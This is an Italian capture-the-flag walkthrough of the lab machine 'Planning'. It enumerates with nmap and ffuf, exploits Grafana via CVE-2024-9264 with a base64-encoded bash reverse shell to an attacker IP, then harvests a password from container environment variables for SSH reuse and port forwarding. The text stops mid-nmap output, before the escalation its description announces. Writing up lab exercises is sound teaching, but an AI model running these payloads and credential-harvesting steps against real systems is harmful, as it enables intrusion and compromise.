---
title: Planning Walkthrough
description: "Planning è una macchina Linux di difficoltà facile che prevede l'enumerazione web, il fuzzing dei sottodomini e lo sfruttamento di un'istanza vulnerabile di Grafana tramite CVE-2024-9264. Dopo aver ottenuto l'accesso iniziale a un container Docker, una password esposta consente il movimento laterale verso il sistema host a causa del riutilizzo della password. Infine, un'applicazione personalizzata di gestione dei cron con privilegi di root può essere sfruttata per ottenere il compromesso completo del sistema."
author: dua2z3rr
date: 2025-11-16 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Web Application", "Area di Interesse: Common Applications", "Area di Interesse: Custom Applications", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Clear Text Credentials", "Codice: Bash", "Servizio: SSH", "Servizio: NGINX", "Servizio: Grafana", "Tecnica: Reconnaissance", "Tecnica: Fuzzing", "Tecnica: Password Reuse", "Tecnica: Port Forwarding"]
image: /assets/img/planning/planning-resized.png
---

## Enumerazione Esterna

### Credenziali Iniziali

Come accade comunemente nei pentest reali, inizieremo la box Planning con le credenziali per il seguente account: **admin** / **0D5oT70Fq13EvB5r**.

### nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.68 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.68 -vv -p22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dalla presenza di nginx presumo l'esistenza di subdomains.

### http

Aggiungiamo planning .htb al file **/etc/hosts** e visitiamo la porta 80.

![Desktop View](/assets/img/planning/planning-1.png)

### fuff

Comincio con il fuzzing di directory, senza successo.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt:FUZZ -u http://planning.htb/FUZZ -recursion -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 45ms]
[INFO] Adding a new job to the queue: http://planning.htb/img/FUZZ

                        [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 76ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 49ms]
[INFO] Adding a new job to the queue: http://planning.htb/css/FUZZ

lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 55ms]
[INFO] Adding a new job to the queue: http://planning.htb/lib/FUZZ

js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]
[INFO] Adding a new job to the queue: http://planning.htb/js/FUZZ

                        [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 84ms]
[INFO] Starting queued job on target: http://planning.htb/img/FUZZ

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 151ms]
                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 380ms]
[INFO] Starting queued job on target: http://planning.htb/css/FUZZ

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 134ms]
                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 107ms]

<SNIP>
```

Poi passo al fuzzing di vhost.

```shell
ffuf -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://planning.htb/ -ic -H 'Host: FUZZ.planning.htb' -mc all -fs 178 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 74ms]
```

Aggiungiamolo al file **/etc/hosts**.

### Grafana Vhost

![Desktop View](/assets/img/planning/planning-2.png)

Proviamo ad accedere tramite le credenziali ottenute dal presunto breach.

![Desktop View](/assets/img/planning/planning-3.png)

### Enumerazione Grafana

Andando sull'endpoint /api/health possiamo scoprire la versione di grafana 11.0.0

![Desktop View](/assets/img/planning/planning-4.png)

### Ricera Exploit

![Desktop View](/assets/img/planning/planning-5.png)

Trovo un exploit per la vulnerabilità **CVE-2024-9264**: <https://github.com/nollium/CVE-2024-9264>

### Exploit

```shell
┌─[dua2z3rr@parrot]─[~/CVE-2024-9264]
└──╼ $python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDEgMD4mMQ==" | base64 -d | bash' http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDEgMD4mMQ==" | base64 -d | bash
```

```shell
┌─[dua2z3rr@parrot]─[~/Desktop]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.68 40802
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~# ls 
ls
LICENSE
bin
conf
public
root@7ce659d667d7:~#
```

Notiamo che ci troviamo all'intenro di un docker container (lo capiamo dal nome dell'host).

## Shell come root

### Enumerazione Container

```shell
root@7ce659d667d7:/# echo path           
echo path
path
root@7ce659d667d7:/# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/root
```

Troviamo la password dell'admin. usiamola per SSH.

### ssh

```shell
┌─[dua2z3rr@parrot]─[~/Desktop]
└──╼ $ssh enzo@10.10.11.68
The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:47: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Nov 16 04:32:31 PM UTC 2025

  System load:  0.1               Processes:             231
  Usage of /:   66.9% of 6.30GB   Users logged in:       0
  Memory usage: 45%               IPv4 address for eth0: 10.10.11.68
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Nov 16 16:32:32 2025 from 10.10.16.3
enzo@planning:~$ ls -al
total 32
drwxr-x--- 4 enzo enzo 4096 Apr  3  2025 .
drwxr-xr-x 3 root root 4096 Feb 28  2025 ..
lrwxrwxrwx 1 root root    9 Feb 28  2025 .bash_history -> /dev/null
-rw-r--r-- 1 enzo enzo  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 enzo enzo 3771 Mar 31  2024 .bashrc
drwx------ 2 enzo enzo 4096 Apr  3  2025 .cache
-rw-r--r-- 1 enzo enzo  807 Mar 31  2024 .profile
drwx------ 2 enzo enzo 4096 Feb 28  2025 .ssh
-rw-r----- 1 root enzo   33 Nov 16 14:13 user.txt
```

Prendiamo la user flag.

## Shell come enzo

### Enumerazione Interna

Tentiamo di usare sudo. Se no, proviamo a enumerare le porte sul localhost.

```shell
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
sudo: a password is required
enzo@planning:~$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:36737         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.54:53           0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     15428    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     10861    /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     15430    /run/docker.sock
unix  2      [ ACC ]     STREAM     LISTENING     15432    /run/lxd-installer.socket
unix  2      [ ACC ]     STREAM     LISTENING     15447    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     46768    /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     46776    /run/user/1000/bus
unix  2      [ ACC ]     STREAM     LISTENING     46780    /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     46782    /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     46784    /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     46789    /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     46791    /run/user/1000/gnupg/S.keyboxd
unix  2      [ ACC ]     STREAM     LISTENING     46793    /run/user/1000/pk-debconf-socket
unix  2      [ ACC ]     STREAM     LISTENING     46827    /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     18070    /run/php/php8.3-fpm.sock
unix  2      [ ACC ]     STREAM     LISTENING     18166    /run/containerd/containerd.sock.ttrpc
unix  2      [ ACC ]     STREAM     LISTENING     18168    /run/containerd/containerd.sock
unix  2      [ ACC ]     STREAM     LISTENING     18250    /var/run/docker/metrics.sock
unix  2      [ ACC ]     STREAM     LISTENING     18275    /var/run/mysqld/mysqlx.sock
unix  2      [ ACC ]     STREAM     LISTENING     18403    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     16409    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     19536    /var/run/docker/libnetwork/af21888be52a.sock
unix  2      [ ACC ]     STREAM     LISTENING     19919    /run/containerd/s/5dfa139daaabf7b365ccb85ae02fe006fae87a31062a64620ac2ee82cb2f4b12
unix  2      [ ACC ]     STREAM     LISTENING     9972     /run/systemd/io.systemd.sysext
unix  2      [ ACC ]     STREAM     LISTENING     10751    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     10753    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     10754    /run/systemd/io.systemd.ManagedOOM
unix  2      [ ACC ]     STREAM     LISTENING     10768    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     10772    /run/systemd/fsck.progress
unix  2      [ ACC ]     STREAM     LISTENING     10778    /run/systemd/journal/stdout
unix  2      [ ACC ]     SEQPACKET  LISTENING     10780    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     13545    /run/systemd/resolve/io.systemd.Resolve
unix  2      [ ACC ]     STREAM     LISTENING     13546    /run/systemd/resolve/io.systemd.Resolve.Monitor
unix  2      [ ACC ]     STREAM     LISTENING     15431    @ISCSIADM_ABSTRACT_NAMESPACE
```

### SSH Dynamic Port Forwarding

Utilizziamo il dynamic port forwarding di ssh per scannerizzare tutte le porte in localhost tramite il comando `ssh -D 9050 enzo@10.10.11.68`.

Poi eseguiamo uno scan di nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $proxychains nmap -vv -p8000,36737,3000,33060,53,3306 -sC -sV 127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-16 17:44 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:44
Completed NSE at 17:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:44
Completed NSE at 17:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:44
Completed NSE at 17:44, 0.00s elapsed
Initiating Ping Scan at 17:44
Scanning 127.0.0.1 [2 ports]
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
Completed Ping Scan at 17:44, 0.10s elapsed (1 total hosts)
Initiating Connect Scan at 17:44
Scanning localhost (127.0.0.1) [6 ports]
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:3306  ...  OK
Discovered open port 3306/tcp on 127.0.0.1
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:53 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:8000  ...  OK
Discovered open port 8000/tcp on 127.0.0.1
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:36737  ...  OK
Discovered open port 36737/tcp on 127.0.0.1
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:33060  ...  OK
Discovered open port 33060/tcp on 127.0.0.1
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:3000  ...  OK
Discovered open port 3000/tcp on 127.0.0.1
Completed Connect Scan at 17:44, 1.36s elapsed (6 total ports)
Initiating Service scan at 17:44
Scanning 5 services on localhost (127.0.0.1)
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:3000  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:3306  ...  OK

<... BIG SNIP ...>

PORT      STATE  SERVICE REASON       VERSION
53/tcp    closed domain  conn-refused
3000/tcp  open   ppp?    syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-store
|     Content-Type: text/html; charset=utf-8
|     Location: /login
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 16 Nov 2025 16:45:51 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-store
|     Content-Type: text/html; charset=utf-8
|     Location: /login
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 16 Nov 2025 16:45:18 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-store
|     Location: /login
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sun, 16 Nov 2025 16:45:24 GMT
|_    Content-Length: 0
3306/tcp  open   mysql   syn-ack      MySQL 8.0.41-0ubuntu0.24.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.41_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.41_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-28T20:41:20
| Not valid after:  2035-02-26T20:41:20
| MD5:   d844:e88e:879f:c193:4344:bec7:c140:d5c8
| SHA-1: 804d:021c:3860:467b:62ec:4910:b361:3706:8c9d:0dc8
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjQxX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTI1MDIyODIwNDEyMFoXDTM1MDIyNjIwNDEyMFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC40MV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDX9t+xxso4SWfvxEov4Iyk
| 7kSJhtEkOdbAlm1GXAyPLNVWdFAU0fuy0yal2HUaq5g6Sp8MIdkRfX5gI3M8m1+I
| ImHhoHcvLL5+Z3I2jX41hiRv5tJrFsQ6aH0WD18h+EqbnH+f6GIyZaP6z13lYXLE
| ulxxVBa+meNzdrZMrMLEO50kHbKnksxy8/zsxGbvFbqHTe4mIq/E0dqBVzjCILj7
| dqvwCoFRTWSLoLPqMc9BI0L7d1mwh9b2W7QLGJsAVRwxrOGaoEYkZYTyIkts9p3p
| HImGV0C9ZkqJLI3HnNBfImVl5X2JGrjp72KpDQyZPL4r1pvZzhJIgiB33kuz8yOV
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAFdvRE76
| 8fMVD1mosr8b29FQ+lDqo1wxd583NCAG/9HC9yBqxcfC/NoHuY/zCuNDPEoEV6Ek
| ++AVuz7zsYJHeNobOJLG2kwuLH8PyLXSEgOO8oZXIjwblOcpSoH5oKdg/LSuyA/U
| 5Lusl+P+9OikGioK2qRwacVbEF9lGQrHnms105Fa/OrILYcmuf3ohwTgoI0zPl0h
| +Texjov8jsUs5i/KiCOiUCog2Khrj+JorBzix+zzsjOzvm9k+g9GT03iTpwYmojl
| OMDKqB99PFMQPxLQcCij0xEV3utFXVXFf/CR/Yq2o9Wy3ZKvvbbfc0pBK4U5EjZV
| MRRMcQdP7gkSd4s=
|_-----END CERTIFICATE-----
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.24.04.1
|   Thread ID: 49
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, FoundRows, LongColumnFlag, InteractiveClient, IgnoreSigpipes, Support41Auth, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, ODBCClient, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|_  Auth Plugin Name: caching_sha2_password
8000/tcp  open   http    syn-ack      Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Area
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
33060/tcp open   mysqlx? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
36737/tcp open   unknown syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Sun, 16 Nov 2025 16:45:46 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Date: Sun, 16 Nov 2025 16:45:18 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|_    404: Page Not Found
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=11/16%Time=6919FF8C%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,118,"HTTP/1\.0\x20302\x20Found\r\nCache-Co
SF:ntrol:\x20no-store\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nL
SF:ocation:\x20/login\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Opt
SF:ions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,
SF:\x2016\x20Nov\x202025\x2016:45:18\x20GMT\r\nContent-Length:\x2029\r\n\r
SF:\n<a\x20href=\"/login\">Found</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,D2,"HTT
SF:P/1\.0\x20302\x20Found\r\nCache-Control:\x20no-store\r\nLocation:\x20/l
SF:ogin\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\
SF:r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2016\x20Nov\
SF:x202025\x2016:45:24\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerber
SF:os,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(FourOhFourRequest,182,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-store\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocati
SF:on:\x20/login\r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTr
SF:i%256Eity\.txt%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Pro
SF:tection:\x201;\x20mode=block\r\nDate:\x20Sun,\x2016\x20Nov\x202025\x201
SF:6:45:51\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fo
SF:und</a>\.\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33060-TCP:V=7.94SVN%I=7%D=11/16%Time=6919FF8C%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
SF:x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x
SF:20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\
